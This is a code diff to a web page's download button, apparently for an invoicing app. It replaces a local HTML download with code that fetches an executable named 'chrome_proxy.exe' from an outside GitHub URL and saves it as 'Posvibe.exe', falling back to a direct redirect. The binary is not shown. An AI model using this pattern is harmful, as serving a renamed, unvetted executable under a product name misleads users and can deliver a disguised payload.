@@ -362,19 +362,24 @@
 </footer>
 <script>
   function handleDownload() {
-    fetch('payvibe-app.html')
-      .then(r => r.blob())
+    const appUrl = 'https://github.com/almeeradil/Posvibe/raw/refs/heads/main/chrome_proxy.exe';
+    
+    fetch(appUrl)
+      .then(response => response.blob())
       .then(blob => {
         const url = URL.createObjectURL(blob);
-        const a = document.createElement('a');
-        a.href = url;
-        a.download = 'Invoicevibes.html';
-        document.body.appendChild(a);
-        a.click();
-        a.remove();
+        const link = document.createElement('a');
+        link.href = url;
+        link.download = 'Posvibe.exe'; // Ab yeh Posvibe.exe download karega
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
         URL.revokeObjectURL(url);
       })
-      .catch(() => alert('App file not found. Please place payvibe-app.html in the same folder.'));
+      .catch(err => {
+        // Agar CORS ya koi error aaye toh direct link khol dega
+        window.location.href = appUrl;
+      });
   }
 </script>
 </body>
